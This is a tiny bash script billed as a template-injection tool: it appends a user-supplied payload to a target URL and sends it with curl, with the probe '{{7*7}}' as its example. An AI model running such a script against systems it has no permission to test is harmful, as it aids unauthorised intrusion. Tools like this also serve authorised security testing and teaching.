#!/bin/bash
# Template Injection - Injecting code into a vulnerable template engine
# Options:
# <target_url> : URL with vulnerable parameter
# <payload> : Template injection payload

# Usage: template_injection.sh <target_url> <payload>
# Example script
# template_injection.sh "http://example.com/template.php?name=1" "{{7*7}}"

# Ensure parameters are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_url> <payload>"
    exit 1
fi

TARGET_URL=$1
PAYLOAD=$2

echo "Starting template injection on $TARGET_URL with payload $PAYLOAD"

# Perform template injection
curl "$TARGET_URL$PAYLOAD"

echo "Template injection completed."
